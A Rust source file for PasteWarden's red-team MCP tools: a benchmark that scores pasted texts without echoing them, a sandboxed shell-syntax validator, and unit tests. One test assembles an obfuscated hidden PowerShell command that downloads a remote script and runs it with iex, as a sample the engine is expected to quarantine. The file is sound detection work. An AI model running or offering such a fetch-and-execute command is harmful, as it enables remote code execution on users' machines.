//! `paste-warden mcp --profile redteam` (phase-5.md §5.7): the guard tools
//! plus `run_benchmark` and `validate_syntax`.
//!
//! Neither tool echoes the input: `run_benchmark` returns verdicts and
//! reason ids per item, `validate_syntax` returns a status and error ids with
//! positions. Payloads are never run; `validate_syntax` only hands the text to
//! the external validator (`--validator-cmd`) over stdin, which parses it in
//! its own sandbox (docs/spikes/s8-syntax-validation.md).

use std::io::{BufRead, BufReader, Read, Write};
use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::mpsc;
use std::time::Duration;

use paste_warden_core::{Action, Context, Engine, Level};
use paste_warden_i18n::Localizer;
use rmcp::handler::server::wrapper::Parameters;
use rmcp::{Json, tool, tool_router};
use schemars::JsonSchema;
use serde::{Deserialize, Serialize};

use crate::l10n::t;
use crate::mcp::{GuardServer, MAX_INPUT_CHARS};
use crate::report_json::{ActionJson, LevelJson};

/// Most items in one `run_benchmark` call (phase-5.md §5.9).
pub const MCP_BENCH_MAX_ITEMS: usize = 1_000;
/// Longest item id, in chars.
pub const MCP_BENCH_MAX_ID_CHARS: usize = 128;
/// How long `validate_syntax` waits for the validator.
pub const MCP_VALIDATOR_TIMEOUT_MS: u64 = 5_000;
/// Longest validator response line read.
pub const MCP_VALIDATOR_MAX_LINE_BYTES: usize = 64 * 1024;
/// Most syntax errors returned.
pub const MCP_VALIDATOR_MAX_ERRORS: usize = 50;
/// Longest syntax error id kept.
pub const MCP_VALIDATOR_MAX_ERROR_ID_CHARS: usize = 64;
/// Default `--validator-cmd`.
pub const DEFAULT_VALIDATOR_CMD: &str =
    "uv run --project redteam python -m redteam.validate.server";

/// Settings of the redteam profile.
#[derive(Debug, Clone)]
pub struct RedteamConfig {
    /// Program and arguments (split on whitespace).
    pub validator_cmd: Vec<String>,
    pub validator_timeout: Duration,
}

impl RedteamConfig {
    pub fn new(validator_cmd: Option<&str>) -> RedteamConfig {
        RedteamConfig {
            validator_cmd: validator_cmd
                .unwrap_or(DEFAULT_VALIDATOR_CMD)
                .split_whitespace()
                .map(str::to_owned)
                .collect(),
            validator_timeout: Duration::from_millis(MCP_VALIDATOR_TIMEOUT_MS),
        }
    }
}

#[derive(Debug, Deserialize, JsonSchema)]
pub struct BenchItem {
    /// Caller's label for the item (≤ 128 chars); returned as is.
    pub id: String,
    /// Text to analyze. Never echoed back.
    pub text: String,
}

#[derive(Debug, Deserialize, JsonSchema)]
pub struct BenchInput {
    /// At most 1000 items.
    pub items: Vec<BenchItem>,
}

#[derive(Debug, Serialize, JsonSchema, PartialEq, Eq)]
pub struct BenchItemResult {
    pub id: String,
    pub action: ActionJson,
    /// Command level.
    pub level: LevelJson,
    pub risk_score: u8,
    /// Message ids of the command and hidden-character reasons.
    pub reason_ids: Vec<String>,
    /// Number of secrets found.
    pub secrets: usize,
}

#[derive(Debug, Default, Serialize, JsonSchema, PartialEq, Eq)]
pub struct BenchSummaryJson {
    pub total: usize,
    pub allow: usize,
    pub warn: usize,
    pub quarantine: usize,
    pub malicious: usize,
    pub suspicious: usize,
}

#[derive(Debug, Serialize, JsonSchema)]
pub struct BenchOutput {
    pub results: Vec<BenchItemResult>,
    pub summary: BenchSummaryJson,
}

/// Shells the validator knows (`redteam.models.Shell`).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "snake_case")]
pub enum Shell {
    Cmd,
    Powershell,
    Sh,
    Bash,
    Zsh,
    Applescript,
}

#[derive(Debug, Deserialize, JsonSchema)]
pub struct ValidateInput {
    /// Script to parse (never run). Never echoed back.
    pub text: String,
    /// Shell dialect; omitted = let the validator detect it.
    #[serde(default)]
    pub shell: Option<Shell>,
}

/// `redteam.models.SyntaxStatus`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "snake_case")]
pub enum SyntaxStatus {
    Ok,
    Invalid,
    RejectedUnsafe,
    ValidatorCrash,
    Unchecked,
}

#[derive(Debug, Clone, Serialize, Deserialize, JsonSchema, PartialEq, Eq)]
pub struct SyntaxIssue {
    /// Parser error id (e.g. `MissingEndParenthesisInExpression`).
    pub id: String,
    #[serde(default)]
    pub line: Option<u64>,
    #[serde(default)]
    pub column: Option<u64>,
}

#[derive(Debug, Serialize, JsonSchema, PartialEq, Eq)]
pub struct ValidateOutput {
    /// Shell the validator used (null when unknown).
    pub shell: Option<Shell>,
    /// `status == ok` and every nested script parsed.
    pub ok: bool,
    pub status: SyntaxStatus,
    /// Error ids and positions only, never text.
    pub errors: Vec<SyntaxIssue>,
}

/// `run_benchmark`: verdicts per item and totals, no input text.
pub fn run_benchmark(items: &[BenchItem], l10n: &Localizer) -> Result<BenchOutput, String> {
    if items.len() > MCP_BENCH_MAX_ITEMS {
        return Err(t(
            l10n,
            "cli-mcp-bench-too-many",
            &[("max", MCP_BENCH_MAX_ITEMS.into())],
        ));
    }
    for it in items {
        if it.text.len() > MAX_INPUT_CHARS && it.text.chars().count() > MAX_INPUT_CHARS {
            return Err(t(l10n, "cli-mcp-too-long", &[]));
        }
        if it.id.chars().count() > MCP_BENCH_MAX_ID_CHARS {
            return Err(t(
                l10n,
                "cli-mcp-bench-id-too-long",
                &[("max", MCP_BENCH_MAX_ID_CHARS.into())],
            ));
        }
    }
    let engine = Engine::default();
    let mut summary = BenchSummaryJson::default();
    let results = items
        .iter()
        .map(|it| {
            let r = engine.analyze(&it.text, &Context::default());
            summary.total += 1;
            match r.action {
                Action::Allow => summary.allow += 1,
                Action::Warn => summary.warn += 1,
                Action::Quarantine => summary.quarantine += 1,
            }
            match r.command.verdict.level {
                Level::Malicious => summary.malicious += 1,
                Level::Suspicious => summary.suspicious += 1,
                Level::None => {}
            }
            BenchItemResult {
                id: it.id.clone(),
                action: r.action.into(),
                level: r.command.verdict.level.into(),
                risk_score: r.command.risk_score,
                reason_ids: r
                    .command
                    .verdict
                    .reasons
                    .iter()
                    .chain(&r.hidden.reasons)
                    .map(|m| m.id.to_string())
                    .collect(),
                secrets: r.secrets.len(),
            }
        })
        .collect();
    Ok(BenchOutput { results, summary })
}

#[derive(Serialize)]
struct ValidatorRequest<'a> {
    id: &'a str,
    shell: Option<Shell>,
    src: &'a str,
}

#[derive(Deserialize)]
struct ValidatorResponse {
    id: String,
    #[serde(default)]
    shell: Option<serde_json::Value>,
    status: SyntaxStatus,
    #[serde(default)]
    errors: Vec<SyntaxIssue>,
    #[serde(default)]
    inner: Vec<InnerVerdict>,
}

#[derive(Deserialize)]
struct InnerVerdict {
    status: SyntaxStatus,
    #[serde(default)]
    inner: Vec<InnerVerdict>,
}

fn inner_ok(v: &[InnerVerdict]) -> bool {
    v.iter()
        .all(|i| i.status == SyntaxStatus::Ok && inner_ok(&i.inner))
}

fn crash(shell: Option<Shell>) -> ValidateOutput {
    ValidateOutput {
        shell,
        ok: false,
        status: SyntaxStatus::ValidatorCrash,
        errors: Vec::new(),
    }
}

/// `validate_syntax`: one JSONL request to a fresh validator process.
/// A validator that cannot be started is a tool error; one that times out,
/// crashes or answers garbage is `validator_crash` (never counted as valid).
pub fn validate_syntax(
    cfg: &RedteamConfig,
    text: &str,
    shell: Option<Shell>,
    l10n: &Localizer,
) -> Result<ValidateOutput, String> {
    if text.len() > MAX_INPUT_CHARS && text.chars().count() > MAX_INPUT_CHARS {
        return Err(t(l10n, "cli-mcp-too-long", &[]));
    }
    let Some((program, args)) = cfg.validator_cmd.split_first() else {
        return Err(t(l10n, "cli-mcp-validator-missing", &[]));
    };
    let mut child = match Command::new(program)
        .args(args)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn()
    {
        Ok(c) => c,
        Err(_) => return Err(t(l10n, "cli-mcp-validator-missing", &[])),
    };
    static NEXT: AtomicU64 = AtomicU64::new(1);
    let id = format!(
        "pw-{}-{}",
        std::process::id(),
        NEXT.fetch_add(1, Ordering::Relaxed)
    );
    let line = serde_json::to_string(&ValidatorRequest {
        id: &id,
        shell,
        src: text,
    })
    .unwrap_or_default();

    let (tx, rx) = mpsc::channel();
    let stdin = child.stdin.take();
    let stdout = child.stdout.take();
    std::thread::spawn(move || {
        if let Some(mut stdin) = stdin {
            let _ = stdin.write_all(line.as_bytes());
            let _ = stdin.write_all(b"\n");
            let _ = stdin.flush();
            // Dropping stdin closes it: a one-shot server may then exit.
        }
        let mut buf = Vec::new();
        if let Some(out) = stdout {
            let mut r = BufReader::new(out.take(MCP_VALIDATOR_MAX_LINE_BYTES as u64 + 1));
            let _ = r.read_until(b'\n', &mut buf);
        }
        let _ = tx.send(buf);
    });
    let got = rx.recv_timeout(cfg.validator_timeout);
    let _ = child.kill();
    let _ = child.wait();
    let Ok(buf) = got else {
        return Ok(crash(shell));
    };
    if buf.len() > MCP_VALIDATOR_MAX_LINE_BYTES {
        return Ok(crash(shell));
    }
    let Ok(resp) = serde_json::from_slice::<ValidatorResponse>(&buf) else {
        return Ok(crash(shell));
    };
    if resp.id != id {
        return Ok(crash(shell));
    }
    let shell = resp
        .shell
        .and_then(|v| serde_json::from_value::<Shell>(v).ok())
        .or(shell);
    let errors = resp
        .errors
        .into_iter()
        .take(MCP_VALIDATOR_MAX_ERRORS)
        .map(|e| SyntaxIssue {
            id: safe_error_id(&e.id, text),
            line: e.line,
            column: e.column,
        })
        .collect();
    Ok(ValidateOutput {
        shell,
        ok: resp.status == SyntaxStatus::Ok && inner_ok(&resp.inner),
        status: resp.status,
        errors,
    })
}

/// Keeps an error id only if it looks like an id (`[A-Za-z0-9_.:-]`, ≤ 64
/// chars) and is not a piece of the payload; otherwise `redacted`.
fn safe_error_id(id: &str, text: &str) -> String {
    let looks_like_id = !id.is_empty()
        && id.chars().count() <= MCP_VALIDATOR_MAX_ERROR_ID_CHARS
        && id
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | ':' | '-'));
    if looks_like_id && !(id.len() >= 6 && text.contains(id)) {
        id.to_owned()
    } else {
        "redacted".to_owned()
    }
}

#[tool_router(router = redteam_router, vis = "pub(crate)")]
impl GuardServer {
    #[tool(
        description = "Red-team profile only. Run PasteWarden's Tier 1 engine over up to 1000 {id, text} items and return, per item, the action, command level, risk score and reason ids, plus totals. Never echoes the texts.",
        annotations(
            read_only_hint = true,
            destructive_hint = false,
            open_world_hint = false
        )
    )]
    async fn run_benchmark(
        &self,
        Parameters(p): Parameters<BenchInput>,
    ) -> Result<Json<BenchOutput>, String> {
        run_benchmark(&p.items, &self.tools.l10n(None)).map(Json)
    }

    #[tool(
        description = "Red-team profile only. Check whether a script parses in a shell (cmd, powershell, sh, bash, zsh, applescript) without running it: the text goes over stdin to the sandboxed syntax validator. Returns the shell, ok, a status (ok, invalid, rejected_unsafe, validator_crash, unchecked) and error ids with line/column. Never echoes the text.",
        annotations(
            read_only_hint = true,
            destructive_hint = false,
            open_world_hint = false
        )
    )]
    async fn validate_syntax(
        &self,
        Parameters(p): Parameters<ValidateInput>,
    ) -> Result<Json<ValidateOutput>, String> {
        let l10n = self.tools.l10n(None);
        let Some(cfg) = self.redteam.clone() else {
            return Err(t(&l10n, "cli-mcp-validator-missing", &[]));
        };
        // The validator is a blocking child process; keep it off the runtime thread.
        tokio::task::spawn_blocking(move || validate_syntax(&cfg, &p.text, p.shell, &l10n))
            .await
            .map_err(|_| "paste-warden: internal error".to_owned())?
            .map(Json)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn l10n() -> Localizer {
        Localizer::new("en")
    }

    #[test]
    fn benchmark_returns_verdicts_without_text() {
        let ps = ["power", "shell"].concat();
        let secret_text = format!(
            "{ps} -w hidden -c \"i{}(i{} 'https://example.invalid/zq.ps1')\"",
            "ex", "wr"
        );
        let items = vec![
            BenchItem {
                id: "a".into(),
                text: secret_text.clone(),
            },
            BenchItem {
                id: "b".into(),
                text: "明天下午三點開會".into(),
            },
        ];
        let out = run_benchmark(&items, &l10n()).unwrap();
        assert_eq!(out.summary.total, 2);
        assert_eq!(out.results[0].action, ActionJson::Quarantine);
        assert_eq!(out.results[1].action, ActionJson::Allow);
        assert!(!out.results[0].reason_ids.is_empty());
        let json = serde_json::to_string(&out).unwrap();
        assert!(
            !json.contains("example.invalid") && !json.contains("三點"),
            "{json}"
        );
    }

    #[test]
    fn benchmark_limits() {
        let many: Vec<BenchItem> = (0..=MCP_BENCH_MAX_ITEMS)
            .map(|i| BenchItem {
                id: i.to_string(),
                text: String::new(),
            })
            .collect();
        assert!(run_benchmark(&many, &l10n()).is_err());
        assert!(run_benchmark(&many[..MCP_BENCH_MAX_ITEMS], &l10n()).is_ok());
        let long_id = [BenchItem {
            id: "x".repeat(MCP_BENCH_MAX_ID_CHARS + 1),
            text: String::new(),
        }];
        assert!(run_benchmark(&long_id, &l10n()).is_err());
    }

    #[test]
    fn missing_validator_is_a_tool_error() {
        let cfg = RedteamConfig::new(Some("paste-warden-no-such-validator-xyz --flag"));
        let err = validate_syntax(&cfg, "echo hi", None, &l10n()).unwrap_err();
        assert!(!err.contains("echo hi"));
        let empty = RedteamConfig::new(Some("   "));
        assert!(validate_syntax(&empty, "echo hi", None, &l10n()).is_err());
    }

    #[test]
    fn error_ids_are_sanitized() {
        assert_eq!(
            safe_error_id("MissingEndParenthesis", "x"),
            "MissingEndParenthesis"
        );
        assert_eq!(safe_error_id("has space", "x"), "redacted");
        assert_eq!(safe_error_id("<script>", "x"), "redacted");
        assert_eq!(safe_error_id("calcexe", "run calcexe now"), "redacted");
        assert_eq!(safe_error_id(&"a".repeat(65), "x"), "redacted");
    }

    #[cfg(unix)]
    fn fake(dir: &std::path::Path, body: &str) -> RedteamConfig {
        use std::os::unix::fs::PermissionsExt;
        let p = dir.join("validator.sh");
        std::fs::write(&p, format!("#!/bin/sh\n{body}\n")).unwrap();
        std::fs::set_permissions(&p, std::fs::Permissions::from_mode(0o755)).unwrap();
        let mut c = RedteamConfig::new(Some(p.to_str().unwrap()));
        c.validator_timeout = Duration::from_millis(1500);
        c
    }

    /// A fake validator that echoes the request id and reports `status`.
    #[cfg(unix)]
    fn echo_status(status: &str, extra: &str) -> String {
        format!(
            "read line; id=$(printf '%s' \"$line\" | sed 's/^{{\"id\":\"\\([^\"]*\\)\".*/\\1/'); \
             printf '{{\"id\":\"%s\",\"shell\":\"bash\",\"status\":\"{status}\",\"errors\":[{extra}]}}\\n' \"$id\""
        )
    }

    #[cfg(unix)]
    #[test]
    fn validator_protocol() {
        let dir = tempfile::tempdir().unwrap();
        let ok = fake(dir.path(), &echo_status("ok", ""));
        let out = validate_syntax(&ok, "echo hi", Some(Shell::Bash), &l10n()).unwrap();
        assert_eq!(out.status, SyntaxStatus::Ok);
        assert!(out.ok);
        assert_eq!(out.shell, Some(Shell::Bash));

        let dir2 = tempfile::tempdir().unwrap();
        let invalid = fake(
            dir2.path(),
            &echo_status("invalid", r#"{"id":"UnexpectedToken","line":1,"column":7}"#),
        );
        let out = validate_syntax(&invalid, "echo (", None, &l10n()).unwrap();
        assert_eq!(out.status, SyntaxStatus::Invalid);
        assert!(!out.ok);
        assert_eq!(
            out.errors,
            [SyntaxIssue {
                id: "UnexpectedToken".into(),
                line: Some(1),
                column: Some(7)
            }]
        );

        let dir3 = tempfile::tempdir().unwrap();
        let hang = fake(dir3.path(), "sleep 30");
        let start = std::time::Instant::now();
        let out = validate_syntax(&hang, "echo hi", None, &l10n()).unwrap();
        assert_eq!(out.status, SyntaxStatus::ValidatorCrash);
        assert!(start.elapsed() < Duration::from_secs(10));

        let dir4 = tempfile::tempdir().unwrap();
        let garbage = fake(dir4.path(), "read line; echo not-json");
        assert_eq!(
            validate_syntax(&garbage, "x", None, &l10n())
                .unwrap()
                .status,
            SyntaxStatus::ValidatorCrash
        );

        let dir5 = tempfile::tempdir().unwrap();
        let wrong_id = fake(
            dir5.path(),
            r#"read line; echo '{"id":"other","status":"ok","errors":[]}'"#,
        );
        assert_eq!(
            validate_syntax(&wrong_id, "x", None, &l10n())
                .unwrap()
                .status,
            SyntaxStatus::ValidatorCrash
        );
    }
}
